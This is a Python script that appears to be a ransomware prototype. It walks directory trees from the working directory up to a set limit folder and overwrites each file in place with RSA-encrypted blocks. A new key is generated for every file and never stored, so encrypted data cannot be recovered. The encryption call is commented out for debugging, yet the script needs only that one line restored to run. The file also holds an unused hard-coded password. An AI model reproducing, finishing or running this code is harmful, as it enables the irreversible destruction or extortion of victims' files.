import sys
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

def decrypt_file(file_path,sec_key):
	#### Decryption
	f_enc = open(file_path,'rb')
	file = f_enc.read()
	f_enc.close()
	f_dec = open(file_path,'wb')
	#block size to be decrypted
	#128 for key size
	bs = 128
	step = 0
	while 1:
		block = file[step*bs:(step+1)*bs]
		if not block:
			break
		else:
			#print len(block)
			f_dec.write(sec_key.decrypt(block))
			step += 1
	f_dec.close()
	return


def encrypt_file(file_path,pub_key):
	#### Encryption
	f_rd = open(file_path,'rb')
	file = f_rd.read()
	f_rd.close()
	f_enc = open(file_path,'wb')
	#block size to be encrypted
	#128 for key size, 42 for the PKCS1
	bs = 128-42
	step = 0
	while 1:
		block = file[step*bs:(step+1)*bs]
		if not block:
			break
		else:
			#print len(pub_key.encrypt(block))
			f_enc.write(pub_key.encrypt(block))
			step += 1
	f_enc.close()
	del file
	return


def RSA_encryption(file_path):
	passwrd = 'fg21r4t!M'
	#### RSA Key generation
	#sec_key = os.urandom(16)
	#1024 : key strength, RSA.generate(2048,e=98456)
	sec_key = RSA.generate(1024)
	#print sec_key.exportKey('PEM')
	pub_key = sec_key.publickey()
	#print pub_key.exportKey('PEM')
	sec_key = PKCS1_OAEP.new(sec_key)
	pub_key = PKCS1_OAEP.new(pub_key)

	#debugg : code works
	#cypher = (PKCS1_OAEP.new(pub_key)).encrypt(plain_txt[:128-42])
	#print len(base64.b64encode(cypher))
	#bloc size to decypher must be calculated
	#text = PKCS1_OAEP.new(sec_key).decrypt(cypher[:128])
	#print text

	#Encryption
	#disable encryption commands for debugging
	##########
	#encrypt_file(file_path,pub_key)
	print(file_path+' encrypted')
	#decrypt_file(file_path,sec_key)
	#print file_path+' decrypted'
	return


	#going deep, ext = extension
	#lock_origin : for explore, True at the start, goes False after first use
def deep(c_dir, origin, lock_origin, lock_explore):
	#c_dir = os.getcwd()
	names = os.listdir(c_dir)
	if lock_origin:
		if lock_explore :
			names.remove(origin.replace(c_dir+'/',''))
		lock_origin = False
	for name in names:
		if os.path.isdir(c_dir+'/'+name):
			deep(c_dir+'/'+name,c_dir,lock_origin,lock_explore)
		else :
			RSA_encryption(c_dir+'/'+name)
	return


	#going back in the dir
	#ext to add later
	#start = current working dir at the beginning
	#origin = dir we came back from
	#lock_explore : to distinguish the first execution, False at first and true after 1st exec
def explore(start, origin, LimitDir, lock_explore):
	if start.find('/') != -1 and start != LimitDir:
		deep(start, origin, True,lock_explore)
		if not lock_explore :
			lock_explore = True
		origin = start
		#going one step back into dir
		start = start.replace(start[start.rfind('/'):len(start)],'')
		explore(start, origin, LimitDir, lock_explore)
	else:
		return



#### Main ####
if __name__ == "__main__":
	#RSA_encryption('divine_comedy.pdf')
	#deep(os.getcwd(), os.getcwd())
	LimitDir = '/home/wa/Desktop'
	explore(os.getcwd(), os.getcwd(), LimitDir, False)
	print('main')
